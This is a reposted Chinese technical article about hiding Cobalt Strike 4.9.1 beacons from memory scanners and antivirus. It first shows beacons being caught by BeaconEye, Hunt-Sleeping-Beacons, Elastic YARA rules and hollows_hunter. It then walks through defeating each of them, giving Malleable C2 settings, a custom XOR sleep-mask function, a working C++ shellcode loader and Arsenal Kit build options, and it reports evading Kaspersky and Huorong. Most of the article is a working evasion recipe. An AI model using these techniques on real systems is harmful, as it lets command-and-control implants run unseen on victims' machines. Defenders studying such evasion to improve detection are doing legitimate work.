<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rjKupk_NLz420aFYE3DILg)<table><tbody><tr><td width="557" valign="top" height="62"><section><strong>声明：</strong>该公众号大部分文章来自作者日常学习笔记，也有部分文章是经过作者授权和其他公众号白名单转载，未经授权，严禁转载，如需转载，联系开白。</section><section>请勿利用文章内的相关技术从事非法测试，如因此产生的一切不良后果与文章作者和本公众号无关。</section></td></tr></tbody></table>

来源：先知社区，作者：Arui

原文：https://xz.aliyun.com/t/14798

现在只对常读和星标的公众号才展示大图推送，建议大家把潇湘信安 “设为星标”，否则可能看不到了！

**0x01 前言**

又到了 xxx 的时间了，在对红队基础设施的准备时写下的这篇文章  

  

**0x02 开始狩猎**

CobaltStrike 版本：4.9.1，不做任何配置启动 teamserver

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWVpZsNVGiaBrlV86JjFpvhHibgeQDRibfd2avMjo4JCG5xkHgWN0diaGh8Q/640?wx_fmt=png&from=appmsg)

  

使用默认配置的生成 x64 位 beacon，上线 pid 为 3040

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWZ6MdxGvKNfBQ6JiaJh3rgibqZToomZicektP10vUJaUYaP5dm1DV3goGQ/640?wx_fmt=png&from=appmsg)

  

### **0x021 BeaconEye**

BeaconEye 的核心原理是通过扫描 CobaltStrike 中的内存特征，并进行 Beacon Config 扫描解析出对应的 Beacon 信息

```
https://github.com/CCob/BeaconEye

```

BeaconEye 是基于. NETFramework 4.8 框架开发的，至少需要. net4.0 以上，为了解决真实环境下低版本服务器没有. net4.0 以上的环境，可以使用 EvilEye 替代 BeaconEye，EvilEye 是 Golang 版本的 BeaconEye

```
https://github.com/akkuman/EvilEye

```

我目前使用的测试环境为 Windows Server 2008，所以直接使用 EvilEye 进行检测，可以看到能直接从内存中提取出 Beacon 的信息

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWz7lEE2a5Jia3xXskqZ6Jv8S4lBIKcg23kYXxGoicPdgovRnq44R1iaIFg/640?wx_fmt=png&from=appmsg)

### **0x022 Hunt-Sleeping-Beacons**

Hunt-Sleeping-Beacons 项目的主要功能是帮助广大研究人员在运行时或其他正在运行进程的上下文场景中识别休眠的 Beacon

```
https://github.com/thefLink/Hunt-Sleeping-Beacons

```

可以看到 Hunt-Sleeping-Beacons 可以检测出异常的进程，但是我在实际测试中发现无法对 x86 进程进行检测

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWfFu5TbZxPibtpSFXP0hQicvFW4aXnBfEL51KzbP0AWYunTLIKbFa8VVQ/640?wx_fmt=png&from=appmsg)

### **0x023 Yara**

Yara 是一个旨在（但不限于）帮助恶意软件研究人员识别和分类恶意软件样本工具

```
https://github.com/VirusTotal/yara

```

```
Elastic安全公司开源检测CobaltStrike的yara规则
https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar
Google GCTI开源检测CobaltStrike的yara规则
https://github.com/chronicle/GCTI

```

使用 Elastic 的 yara 规则检测 beacon，可以看到命中了 6 条规则  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW2aM2eEicAw025CzDc4sd2sTr5E6tygatEcp7513BmLtONMah0RWqOMQ/640?wx_fmt=png&from=appmsg)

  

使用 - s 参数打印出匹配的字符串

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWddgt5ibsZsBLTeXj8Drz2Iwaialc7FuxtVBddL0r782W4546SXabia86A/640?wx_fmt=png&from=appmsg)

### **0x024 Hollows_Hunter**

hollows_hunter 用于扫描所有正在运行的进程，识别各种潜在的恶意植入物，如替换 / 植入的 PE、shellcode、挂钩（hook）以及内存中的修补程序等

```
https://github.com/hasherezade/hollows_hunter

```

顺带提一嘴，Hollows_Hunter 的作者 Aleksandra Doniec 在我看来是一位顶尖的安全研究员，开源了 pe_to_shellcode、process_overwriting 等优秀的作品，真正左右手互博

```
https://github.com/hasherezade/pe_to_shellcode
https://github.com/hasherezade/process_overwriting

```

通过 hollows_hunter 可以很轻松的检测到一些异常的进程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWRUKhbJibQkAc5sKicic80B8M0do2WicbicxLDXr9pcE3griakWy9pobX6D8g/640?wx_fmt=png&from=appmsg)

  

**0x03 反狩猎**

针对以上问题，CobaltStrike 官方在博客中提供了一些解决方法  

```
https://www.cobaltstrike.com/blog/cobalt-strike-and-yara-can-i-have-your-signature

```

### **0x031 Yara bypass**

#### **0x0311 字符串处理**

可以看到 Windows_Trojan_CobaltStrike_ee756db7 匹配了很多字符串，我决定先看看这些字符串都是从哪里来的。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWddgt5ibsZsBLTeXj8Drz2Iwaialc7FuxtVBddL0r782W4546SXabia86A/640?wx_fmt=png&from=appmsg)

CobaltStrike 在 4.x 之后，会把资源文件加密存放到 cobaltstrike-client 端的 sleeve 目录中，需要使用 CrackSleeve 对资源文件进行解密

```
https://github.com/ca3tie1/CrackSleeve

```

CobaltStrike4.9.1 的 key 如下，需要自行替换一下

```
private static byte[] OriginKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};
private static byte[] CustomizeKey = {-1, 12, -6, 65, 7, -47, 91, 48, 17, 61, 29, 43, -99, -23, 21, 109};

```

对 cobaltstrike-client 及解密的 Resource 进行搜索，最后在 default.profile 发现了结果，而且与 Windows_Trojan_CobaltStrike_ee756db7 匹配的规则一致

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWNqsS0BQiaB8b7dfoPC4wmZb1icfMqZtp1iazKv6CnJaO5UDePp3OVVwJg/640?wx_fmt=png&from=appmsg)

把他复制出来，并删除 stage 里面内容作为 Malleable-C2 来使用，重新启动 server，生成 beacon 上线

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW8cOl8T2U4XXnEKWficll3knIRl9oiaKNe74y5l9r7HgrWYm8mwv4ia7Iw/640?wx_fmt=png&from=appmsg)

再次使用 yara 检测发现字符串匹配特征已经少了很多，但是还有一些存在

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWThPBYKC2VqHDAichIicmCeIl2fSgmGWiaibRlcpRn1Ziap6axMQx0AyulvA/640?wx_fmt=png&from=appmsg)

既然 profile 中的特征已经去除了，那么剩余的规则要么在原始 beacon.dll 中存在，要么就是生成的 exe 时出现的特征，先看看原始 beacon.dll 吧，使用 yara 单独对文件进行检测，可以明显的看到，确实是在原始 beacon.dll 中存在的特征

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW4SPESBnBWAYicOp2x2gibicW8MXUo0HYdCgjGdVljpjb3ExXasertqvLA/640?wx_fmt=png&from=appmsg)

针对这种情况，CobaltStrike 提供了可以从 profile 中使用 strrep 来替换指定的字符串，把其中的一个特征替换为空

```
transform-x64 {
    strrep "beacon.x64.dll" "";
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWBjKVlQlYXLU4ovjqaWBgNR1Dntmc1coGe6KKlNzoNFRiaULsuuic9ENQ/640?wx_fmt=png&from=appmsg)

再次生成 beacon，运行发现 ee756db7 规则直接就消失了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWuPGx39r9JGz91lY7YQib6s0F29vcsENkUymoC0icZiagdaaL4qrg2eIAQ/640?wx_fmt=png&from=appmsg)

？？？我看了一下 Windows_Trojan_CobaltStrike_ee756db7 的判定规则，发现该规则需要至少 6 个命中才会判定

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWjUmIRVtdzWklAC3yTlVZSUEyqmqibFmfEv65QDqNv6FoCcSnYL1cNUg/640?wx_fmt=png&from=appmsg)

虽然这种方法简单且有效，但是从实际考虑来说，我们不应该全部都这么做，因为无法确定其他安全公司使用的规则，如果修改了判断规则为 3 个你只修改其中一个，那肯定是不行的，并且有些格式化字符串也不应该直接修改，否则可能会给程序带来不可意料的结果，如 Windows_Trojan_CobaltStrike_3dc22d14 中还检测了一些格式化字符串

当然也不是没有解决方法。那就是 sleepmask kit 套件，后面会详细介绍

#### **0x0312 MZ 头 / PE 头处理**

可以看到 Windows_Trojan_CobaltStrike_1787eef5 的特征为 4D 5A，很明显该处检测的是 MZ

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWy7XEZMib6QLicyKK1LNuF8fcWfuliaqiarIvtwkeSekIFD8jKTyicJvJIww/640?wx_fmt=png&from=appmsg)

可以从内存中看到，确实存在该特征

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWDOwRTRefAiaC4ibHJlibeAfulicwuKgU6ZBHNibDlXCvEu0HTpZDtia8F6FQ/640?wx_fmt=png&from=appmsg)

针对这种情况，CobaltStrike 提供了可以在 profile 中配置 `Stage.magic_mz_*`/`Stage.magic_pe_*`对其进行修改

**官方建议：**需要注意的是，对于 magic_mz_* 选项，提供的值必须是有效的（无）操作码，因为它们是作为 shellcode 存根的一部分执行的第一条指令。通常情况下，这将是`pop regA，push regA`的某种变体，因为后一条指令撤消了第一条指令，但请参阅此处以获得有关配置此选项的更多指导

```
https://www.redteam.cafe/red-team/shellcode-injection/magic_mz_x86-and-magic_mz_x64

```

修改 mz 头

```
set magic_mz_x86 "KC@H"; # ASM = dec ebx, inc ebx,inc eax, dec eax
set magic_mz_x64 "A[AS"; # ASM = pop r11, push r11

```

修改 pe 头  

```
set magic_pe "AR"; # 随机的两个值

```

修改完成后在内存中的效果  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWqvCpoH7N6UL3BMDUWNUD38dIicicH8iaCMStkibwWMS9Q8atLftXHKNyHw/640?wx_fmt=png&from=appmsg)

使用 yara 进行检测的前后对比

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWeIDH1kAOicx5ziac7DlTnsT0nrAttEd3ibziaIqV7qqJBZAMFLplibLwicCA/640?wx_fmt=png&from=appmsg)

然而，这种修改方式是有限的，因为我们在每种情况下只能修改几个字节，所以显然更健壮的 YARA 签名仍然会触发

同时官方还提供了一个 Stage.stomppe 用于轻微混淆内存中的 beacon dll，但是我在测试发现设置 stomppe 为 true 时，PE 头中的仅仅在特征处增加了一个 IMAGE_FILE_RELOCS_STRIPPED

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWJtwiaM91UKeoPX9olEnd04KqYY4A8hsH5eb0pxkADgAUK7sSAEYZvbg/640?wx_fmt=png&from=appmsg)

未设置 stomppe 时

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWH9VFYre96fL9R9cuhNblHLA4cTLW2mylCEvsZjVLwPyQeNj01oQyOA/640?wx_fmt=png&from=appmsg)

从微软的文档来看，我并不能明白这么做有什么好处，感觉很鸡肋，比较了解的师傅们回答我一下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWLhzKUE6yJALseZV4kem3QavDvWTZkKsicXrJVD3Hater1TLFSuEcJkw/640?wx_fmt=png&from=appmsg)

#### **0x0313 清理反射加载器**

当 Beacon 被反射加载到内存中时，它会导致两个内存分配：原始 Beacon DLL（实际上将执行 shellcode 存根和反射加载器函数）和虚拟 Beacon DLL（正确加载到内存中并准备就绪）

在内存中的情况如下，RWX 存储器区域对应于虚拟信标 DLL，而 RX 区域则对应于原始信标 DLL

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWMQL4FBkibwdAia0ricf0K8aoJuUaStDGpFC0XoVrAUAVhLkZJfZuCbTmw/640?wx_fmt=png&from=appmsg)

同时原始信标 DLL 中也存在可疑字符串。这些都可以通过内存中的 YARA 扫描找到

前面的是原始 beacon，后面的是配置 strrep "beacon.x64.dll" ""; 去除字符串后的内存，还应该把 ReflectiveLoader 这个非常明显的特征给去除掉

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW1PwtCedM0fshmLOyicyGE4ibaQaX1gNq3icgosgxjUvN0lad0ADibWPiccA/640?wx_fmt=png&from=appmsg)

扯远了，回到正题，针对这种情况，CobaltStrike 提供了可以在 profile 中配置 Stage.cleanup 选项为 true，对原始 Beacon DLL 进行清除，

仅保留虚拟 Beacon DLL，一旦启动 Beacon，就不再需要原始 Beacon DLL 了

```
set cleanup "true";

```

清理前后的内存对比

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWoBqY3Cp0b3ufIkZ8P2BynAialmwnbvmT3lQoGxbiaicTA8haLOtmvT2VQ/640?wx_fmt=png&from=appmsg)

yara 检测结果如下，很明显清除原始 beacon dll 后有些检测已经从 2 个变成一个了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWkaucUtucYwwAicjplZoC7xX7hDD7X3beNX4j8rJiaEYSt8Qic1FcYLnqw/640?wx_fmt=png&from=appmsg)

#### **0x0314 配置混淆**

通过配置 Stage.obfuscate 为 true，可以实现反射加载器复制 Beacon，而不带它的 DLL 头，这就意味着在内存中无法再找到反射加载程序存根，而且这个选项还会混淆：

```
.text section
Section names
Import table
Dos/Rich Header (this is technically not masked but overwritten with random data)

```

大概的示例图如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW7lUUr3ZicdenNGJYPXzmA67s0AEq7xQ3icBHNHTVblibpXfib7Dt7zr0Ow/640?wx_fmt=png&from=appmsg)

这项设置可移除 Beacon 堆中的绝大部分字符串

```
set obfuscate "true";

```

后面是配置 obfuscate 为 true 的内存，可以看到直接去除掉了 dll 头部

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWicGY774Fug9RW7poUdLJBvMPAf8ZGViaZHibPMJX4MHSR31UWmRT4pTjw/640?wx_fmt=png&from=appmsg)

yara 检测设置 obfuscate 为 true 的前后对比

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWcyuURJ4icILnPxS5oCooESX3elesoLJsSeraEbAXVu2ZFM0MEdfmYcQ/640?wx_fmt=png&from=appmsg)

#### **0x0315 Sleep_Mask**

官方解释如下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWibxricfFKI3qDKibbytjWOCe8icr7L9GQcgZMPznzM7tL02AbSx5ibHSoZQ/640?wx_fmt=png&from=appmsg)

在启用 Sleep_Mask 之前，先了解一下 userwx 配置

```
set userwx "false";

```

反射加载时是否要把内存设置为可读可写可执行，默认为 RWX，设置为 false 时内存设置为 RX

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWZPlM6EiaKXbScc7tAGGEyZIt90JyJpQ7qocnuWaATPBictBaMNCAGaWw/640?wx_fmt=png&from=appmsg)

然后配置启用 sleep_mask

```
set sleep_mask "true";

```

正如官方所说，确实对字符串进行了加密，但是会多出一条新的规则，很明显 sleep_mask 默认的规则已经被检测了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWCpnR2ibGo9Wn9W6WfD1KzCGEM1Bug8ZsRWXsq9QURO3icS1SJ3tPp01Q/640?wx_fmt=png&from=appmsg)

在内存中也确实找到了这个规则

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWTcAibjvQ5vuyicryX3nFIOJl4eyHQpHdo0khDL4b2Io1BNE5D5GJic2gw/640?wx_fmt=png&from=appmsg)

不是说 sleep_mask 会屏蔽自己吗？其实这项规则恰恰匹配的就是 sleep_mask 屏蔽的方法，如下图所示

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWxe6iauSa2YZgC1aNqzluS4WbuGVd87Z1SRSwRllSjsF3ysZcVMhbSTw/640?wx_fmt=png&from=appmsg)

使用 arsenal-kit 的 sleepmask 进行配置，在 common_mask.c 中自定义我们的算法

```
/* My a beacon section
 *   First call will mask
 *   Second call will unmask
 */
void my_mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
   char key[] = "cf81d743beef8422";
   size_t key_lenght = sizeof(key) - 1;
   while (a < b) {
      *(parms->beacon_ptr + a) ^= key[a % key_lenght];
      a++;
   }
}

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWJcWSRxPwiaxHpqlGibw9Hy1sqCic0BWARaaxxDTiajXLlwgEPvS13g7GeA/640?wx_fmt=png&from=appmsg)

最后重新构建并重新加载. cna 脚本，以使更改生效

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW9ibLMfdKFTWOFibv3NE1RcR2wic7H4WpNARFRgoCiamc3gkfNWQgBJVY5g/640?wx_fmt=png&from=appmsg)

yara 检测使用自定义算法的 beacon，最后只剩一条特征了

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW9W7ElyHttRfAYm4rH5JOKkNCGp9a4TSJiazuqDPicxXaiczvcsp1Nq2Vw/640?wx_fmt=png&from=appmsg)

在内存中默认算法和自定义加密算法的对比

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWaetoZgCH9XpsgoSLw9QmHohhGVnBm81WjLEo3m2QhNcEmdibNXTDaRA/640?wx_fmt=png&from=appmsg)

#### **0x0316 加载器特征去除**

##### **0x03161 shellcode loader**

最后的这个特征，其实是生成 exe 时附带的。如果使用 shellcode loader 进行上线这一个部分就不需要更改了

不过使用 shellcode loader 要注意需要对存放 shellcode 的内存进行加密或者清理，非常简单的代码，主要是为了演示

```
#include<iostream>
#include<windows.h>
#include<fstream>
using namespace std;
int main()
{
    // shellcode raw 
    char filePath[] = "./payload_x64.bin";
    ifstream file(filePath, ios::binary | ios::ate);
    if (!file) {
        return -1;
    }
    int fileSize = file.tellg();
    file.seekg(0, ios::beg);
    char* buffer = new char[fileSize];
    if (!file.read(buffer, fileSize))
    {
        return -2;
    }
    void* exec = VirtualAlloc(0, fileSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, fileSize);
    // 对buffer进行加密
    string key = "cf81d743beef8422";
    for (int i = 0; i < fileSize; i++)
    {
        buffer[i] = buffer[i] ^ key[i % key.length()];
    }
    ((void(*)())exec)();
    return 0;
}

```

效果如下

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWLiaMH0NktqKazYzToIzY6h9ynuYOic2QO7O8Gax0a8BUAVDEyFqWIXfQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWLI1VAneV61rXDvrwEtsfbOk6yupMv4D3UicEmp2Gu5BsgibUicQgC8icDQ/640?wx_fmt=png&from=appmsg)

##### **0x03161 源码修改**

当然如果你追求完美，可以接着往下看，不过首先说明，**通过套件的方式进行修改的只能在生成 exe 文件的时候有效，shellcode 还是需要使用完成在内存进行加密**

首先先定位一下特征，我直接使用 ida 对该字节码进行搜索

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWzrW1QDrMYNEqEDosvE8AEeqxMbF2ottB48iaxHxtRcD6F0sk0cVWggw/640?wx_fmt=png&from=appmsg)

伪代码看一下，看起来是 //./pipe/MSSE - 随机整数 - server 的通道生成

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWribswhfDflj1LD6HmvyCOHqQkJYEkcSatCo5nurtPO1uswEiaI3PqtHQ/640?wx_fmt=png&from=appmsg)

在 CobaltStrike 的博客中有提到这个问题，指明了可以通过 Artifact Kit 中的 src-common/bypass-pipe.c 进行修改

```
https://www.cobaltstrike.com/blog/learn-pipe-fitting-for-all-of-your-offense-projects

```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWOv9rK1tXHmXGOkeDSVv9IES1FiaQ6RDGWahia1bo6j24yjnlvKAvsIYg/640?wx_fmt=png&from=appmsg)

当然，如果你不想使用多余的套件，可以自行反编译修改并打包原始 beacon.dll 进行

我这边就演示在 bypass-pipe.c 中进行修改，注释部分的是 Artifact Kit 中默认的，该方法也已经被 yara 标记了，我做的只是简单的字符串隐藏

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWnTfE9R8Fpibu6lGUia7iawrWzgnvRg4VUCEcmPa1aFnwMJpIMJnRuTPCA/640?wx_fmt=png&from=appmsg)

因为使用了 arsenal-kit 中的 artifact-kit 和 sleepmask-kit，所以直接修改 arsenal-kit 配置文件生成一个套件即可

修改的位置如下：

```
/arsenal-kit/kits/artifact/build.sh:49-51行，给它注释掉就不会报错了
/arsenal-kit/arsenal_kit.config:16行，设置include_sleepmask_kit="true"，因为还启用了sleepmask-kit

```

接下来是 Artifact kit options 和 Sleepmask kit options，根据实际情况修改即可

```
#### Artifact kit options
artifactkit_technique="pipe"
artifactkit_allocator="HeapAlloc"
artifactkit_stage_size=310272
artifactkit_include_resource="false"
artifactkit_stack_spoof="false"
artifactkit_syscalls_method="indirect"
#### Sleepmask kit options
sleepmask_version="49"
sleepmask_sleep_method="WaitForSingleObject"
sleepmask_mask_text_section="true"
sleepmask_syscalls_method="indirect"

```

运行 / arsenal-kit/build_arsenal_kit.sh 生成即可，生成后的路径为 / arsenal-kit/dist/

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWp6hmwBic6WPFwMsy3L5hwA5fGAuAUliaOmBn8FGodLianN4VynAHufrqQ/640?wx_fmt=png&from=appmsg)

加载该套件，重新生成 beacon，运行上线，使用 yara 对进程进行检测，可以看到和 shellcode loader 上线一样是检测不到的

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWfmOnDE4bibicEsmywvvpbbExFM8zxM5xjEIZALzYGfn6xowOlrFIsyIw/640?wx_fmt=png&from=appmsg)

以上是 x64 的修改，x86 也同样适用，不过 x86 需要额外修改一下 2 个位置

```
/arsenal-kit/kits/artifact/src-common/bypass-pipe.c中的DWORD server_thread(LPVOID whatever) 方法

```

打乱一下它的结构就行

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWxKezrT1yElerMTgib8AgTMtMnqGfLXMk21aGpMauqibjVRiaVf5lehU2w/640?wx_fmt=png&from=appmsg)

```
/arsenal-kit/kits/artifact/src-common/patch.c

```

也是打乱一下结构

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSW4S8lY8CWOIFtUR4pibhSWAPblWofibibc4fcvPaR2vfWO5mOv84yLg6vA/640?wx_fmt=png&from=appmsg)

**0x04 效果测试**

其实到了这一步已经能解决狩猎中的所有检测了  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWBMVw4iab2K4H4AGq3e1FjaDC2kAicXcMDSMMHLwXeHwxMNK7ziccyaf2w/640?wx_fmt=png&from=appmsg)

yara 静态检测

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWGPGrwEzdK5pYOsFGfvGcxXmUHycLwg5giag55tTKB0RgIZdJK6VQ5ibQ/640?wx_fmt=png&from=appmsg)

yara 内存检测

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWRdMBAjKTPNEalyzvUtCo4VYAPqJy7STJzhs7uPYIO1rBa0Ecx1IxyA/640?wx_fmt=png&from=appmsg)

BeaconEye/EvilEye

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWQ7ELs2o9KuzFnkY1GplickevbK4zTMn0GXBpVkvlEVaYgDydSwoxsrg/640?wx_fmt=png&from=appmsg)

Hunt-Sleeping-Beacons

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWHOE2pyb3YcTnYJSujod6TDicW8AX66YEtVcjZr3wnicIQRWyoWBic3S3A/640?wx_fmt=png&from=appmsg)

Hollows_Hunter

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWvRY55ngYV727fSLod9Dn56QdeHuiatiby84koUcwGJd9Fu9XGriceSGDw/640?wx_fmt=png&from=appmsg)

配合 shellcode loader 对抗大部分杀软了

卡巴内存扫描

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWVZ1RAjibFmI7tsB4c6J8KT8BnfGGPnqaXE50s73d4GD5AibdU1hiavwEw/640?wx_fmt=png&from=appmsg)

火绒

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWwl8k25DnnWBTE90k5IVI5WAGRqQ6ce7xWiah5gj1tXBFkvPHegwPjUA/640?wx_fmt=png&from=appmsg)

**0x05 结语**

到此为止，配合一下自定义的 Malleable-C2 足以应付大部分红队场景，如果还想进一步，建议配合 unhook、堆栈欺骗等技术  

嘿嘿，如果你以为这就结束了，那就错了，如果说我针对 Artifact Kit 套件进行 yara 打标呢？以下是我找另一位师傅拿的 ta 自己制作好的免杀马，上面是 Elastic 的检测，下面是自己针对 Artifact Kit 套件写的规则

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOdJdKR4pdQxtuyYqf1MaWSWr20Q7kSjDUajLicFicUrF8d7g9e7OEla7R0BlQrnIQYNyPI8gcSABPTg/640?wx_fmt=png&from=appmsg)

最后欢迎各位师傅有空可以去我 blog 踢我一脚

```
作者blog：https://blog.aruiredteam.com/

```

**关注我们**

![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1) 还在等什么？赶紧点击下方名片开始学习吧！![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOeSsicAgIUNHtMib9a69NOWXw1A7mgRqqiat1SycQ0b6e5mBqC0pVJ3oicrQnCTh4gqMGiaKUPicTsUc4Tw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

**知 识 星 球**

  

  

仅前 1-400 名: 99¥，400-600 名: 128¥，600-800 名: 148¥，800-1000 + 名: 168¥

![](https://mmbiz.qpic.cn/sz_mmbiz_png/XOPdGZ2MYOcKGNyJ8jSPNpMahribWIY2cut8eAiakTpr6lAzlLt1xubcuUg4la0LMHmhnENia4icnjOwTsfDqq4I7A/640?wx_fmt=png&from=appmsg)

**推 荐 阅 读**

  

  

  

[![](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOe2nibXhkXA8A79MhARiaW5Q0H2aiaR0OwyR63JAI1pRGAc7FZMgIHb9kicboQziaJkTbnlAgOvkdiaHf5g/640?wx_fmt=png)](http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247499188&idx=1&sn=9ce15a0e66b2595285e544aaa0c49c24&chksm=cfa559a7f8d2d0b162f00e0c1b02c85219f2668c282b32967b2530f15051b47b21ee2855a783&scene=21#wechat_redirect)

